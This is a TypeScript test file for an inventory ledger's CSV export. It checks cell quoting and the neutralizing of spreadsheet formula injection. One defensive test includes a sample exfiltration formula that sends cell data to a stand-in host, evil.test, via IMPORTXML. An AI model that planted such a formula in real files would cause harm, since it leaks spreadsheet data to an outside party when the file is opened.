import { describe, expect, it } from "vitest";
import { INVENTORY_TRANSACTION_LABELS, csvCell, toCsv } from "@/lib/inventory-ledger";

// CSV injection is the interesting risk here, not formatting. Product names and
// operator-entered reasons are free text, and a spreadsheet treats a leading
// =, +, - or @ as a formula to EXECUTE when the file is opened.
describe("csvCell", () => {
  it("quotes every value so delimiters cannot break the row", () => {
    expect(csvCell("Plain")).toBe('"Plain"');
    expect(csvCell("has, comma")).toBe('"has, comma"');
    expect(csvCell("has\nnewline")).toBe('"has\nnewline"');
  });

  it("doubles embedded quotes rather than truncating the field", () => {
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
  });

  it.each(["=1+1", "+1", "-1", "@SUM(A1)"])("neutralizes the formula %s", (input) => {
    const cell = csvCell(input);
    expect(cell.startsWith(`"'`)).toBe(true);
  });

  // The realistic attack: a reason field typed by anyone with admin access, or
  // a product name imported from a supplier sheet.
  it("neutralizes a formula that would exfiltrate data on open", () => {
    const malicious = '=IMPORTXML(CONCAT("http://evil.test/?v=",A1),"//a")';
    expect(csvCell(malicious)).toContain(`"'=IMPORTXML`);
  });

  it("renders null and undefined as empty, not as the words", () => {
    expect(csvCell(null)).toBe('""');
    expect(csvCell(undefined)).toBe('""');
  });

  it("does not mangle a normal negative number in a numeric column", () => {
    // Guarded, so it stays text rather than being read as a formula. The header
    // makes the meaning clear, and correctness beats spreadsheet convenience.
    expect(csvCell(-3)).toBe(`"'-3"`);
  });
});

describe("toCsv", () => {
  it("emits a header row followed by the data", () => {
    const csv = toCsv(["A", "B"], [[1, 2], [3, 4]]);
    expect(csv).toBe('"A","B"\r\n"1","2"\r\n"3","4"\r\n');
  });

  it("uses CRLF, which is what Excel expects", () => {
    expect(toCsv(["A"], [["x"]])).toContain("\r\n");
  });

  it("still produces a usable file when there are no rows", () => {
    expect(toCsv(["A", "B"], [])).toBe('"A","B"\r\n');
  });
});

describe("transaction labels", () => {
  // Every type needs a human label; a raw enum leaking into the history screen
  // ("order_reserved") is the kind of thing nobody fixes later.
  it("gives every transaction type a readable name", () => {
    for (const [key, label] of Object.entries(INVENTORY_TRANSACTION_LABELS)) {
      expect(label.length).toBeGreaterThan(0);
      expect(label).not.toBe(key);
    }
  });

  it("covers the movements the fulfillment flow actually produces", () => {
    for (const key of ["order_reserved", "order_completed", "order_canceled", "refund_restock"]) {
      expect(INVENTORY_TRANSACTION_LABELS).toHaveProperty(key);
    }
  });
});
